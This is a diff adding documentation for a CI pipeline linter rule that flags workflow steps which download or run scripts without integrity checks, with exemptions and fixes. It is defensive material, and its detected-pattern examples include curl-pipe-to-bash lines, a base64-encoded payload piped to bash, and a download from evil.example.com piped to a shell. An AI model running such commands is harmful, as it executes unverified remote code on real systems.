@@ -57,6 +57,7 @@ reading the upstream docs.
 
 | Code | Name | Severity |
 | :--- | :--- | :--- |
+| [ISSUE-411](#issue-411--unverified-scripts) | `unverified-scripts` | high |
 | [ISSUE-802](#issue-414--dangerous-triggers) | `dangerous-triggers` | **critical** |
 | [ISSUE-804](#issue-415--pull-request-target-with-head-checkout) | `pull-request-target-with-head-checkout` | **critical** |
 
@@ -1078,6 +1079,125 @@ jobs:
 When a matrix genuinely needs to choose among N secrets, split the
 job into N jobs with static names — the verbosity is worth the
 reviewability.
+
+---
+
+## ISSUE-411 — `unverified-scripts`
+
+**Severity:** `high` • **Control:** `pipelineMustNotExecuteUnverifiedScripts`
+
+A `run:` step downloads or inline-executes code without any integrity
+check. Maps to OWASP CICD-SEC-3 (Dependency Chain Abuse) and CICD-SEC-8
+(Ungoverned Usage of 3rd Party Services). The October 2025 Megalodon
+mass-backdooring campaign (SafeDep) was the operational version of
+this risk class: workflows that ran an obfuscated payload via
+`echo "<base64>" | base64 -d | bash`.
+
+### Detected patterns
+
+The rule fires on any of these on a single script line:
+
+```yaml
+# Pipe curl|wget straight into a shell
+- run: curl -sSL https://example.com/install.sh | bash
+- run: wget -qO- https://example.com/install.sh | sh
+
+# Download then execute
+- run: curl -fsSL https://example.com/install.sh -o install.sh && bash install.sh
+
+# Redirect to a file then execute
+- run: curl -fsSL https://example.com/payload.sh > install.sh; sh install.sh
+
+# Megalodon-style inline payload (the CVE pattern)
+- run: echo "Q0I9Imh0dHA6Ly8yMTYuMTI2LjIyNS4xMjk6ODQ0MyI=" | base64 -d | bash
+
+# Generic <cmd> | <shell>
+- run: cat /tmp/payload.sh | sh
+
+# Heredoc-as-camouflage on a download (still fires — the heredoc
+# does not shield a remote pipe-to-shell on the same line)
+- run: curl https://evil.example.com/payload | bash <<EOF
+```
+
+### Silent on legitimate patterns
+
+False-positive guards keep the signal sharp:
+
+```yaml
+# Pipe-to-shell substring inside a quoted string — documentation, not execution
+- run: echo "Install with curl https://example.com/install.sh | bash"
+
+# Heredoc-to-shell with no download on the line — operator-authored,
+# in-tree content; any unsafe download in the body still fires on its
+# own script line
+- run: |
+    cat <<'EOF' | bash
+    echo "verified, in-tree content"
+    EOF
+
+# Innocent pipes (no shell target)
+- run: echo hello | wc -l
+- run: ls | grep foo
+- run: cat README.md | head -n 5
+```
+
+### Exempted via integrity check on the same line
+
+A verification command anywhere on the same line as the download
+exempts the line. Recognised: `sha256sum` / `sha512sum` / `sha1sum` /
+`shasum`, `gpg --verify`, `cosign verify` / `cosign verify-blob`.
+
+```yaml
+# ✅ checksum
+- run: curl -sSL https://example.com/install.sh -o install.sh && sha256sum -c install.sha256 && bash install.sh
+
+# ✅ signature
+- run: curl -sSL https://example.com/install.sh -o install.sh && gpg --verify install.sh.sig install.sh && bash install.sh
+
+# ✅ cosign
+- run: curl -sSL https://example.com/install.sh -o install.sh && cosign verify-blob --signature install.sig install.sh && bash install.sh
+```
+
+The verification check itself is quote-aware: a keyword inside a
+string (`echo "should sha256sum first" && curl evil | bash`) does NOT
+exempt the line — only a real verification command on the unquoted
+part of the line does.
+
+### Exempted via trusted URL
+
+```yaml
+# ❌ before
+- run: curl -sSL https://internal-artifacts.example.com/install.sh | bash
+```
+
+```yaml
+# ✅ after — declare the host in .plumber.yaml
+# github:
+#   controls:
+#     pipelineMustNotExecuteUnverifiedScripts:
+#       enabled: true
+#       trustedUrls:
+#         - https://internal-artifacts.example.com/*
+- run: curl -sSL https://internal-artifacts.example.com/install.sh | bash
+```
+
+`trustedUrls` matches via glob and is host-precise:
+`https://example.com/*` exempts `example.com/...` but never bleeds
+into `evil.example.com/...`.
+
+### Canonical fix
+
+```yaml
+# ❌ before
+- run: curl -sSL https://example.com/install.sh | bash
+
+# ✅ after — vendored script + lockfile-style install
+- run: bash scripts/setup.sh
+- run: |
+    curl -sSL https://example.com/install.sh -o install.sh
+    echo "<expected-sha256>  install.sh" | sha256sum -c -
+    bash install.sh
+```
 
 ---
 
